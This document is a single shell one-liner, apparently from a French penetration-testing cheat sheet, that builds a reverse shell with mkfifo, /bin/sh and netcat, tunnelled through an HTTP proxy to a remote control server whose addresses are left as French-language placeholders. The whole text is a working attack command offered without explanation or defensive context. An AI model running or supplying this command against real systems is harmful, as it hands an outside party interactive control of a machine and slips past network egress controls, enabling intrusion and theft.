
```shell
mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1 | nc -X connect -x [IP Proxy]:[Port Proxy] [IP du serveur de contrôle] [Port en écoute pour le reverse shell] > /tmp/f; rm /tmp/f
```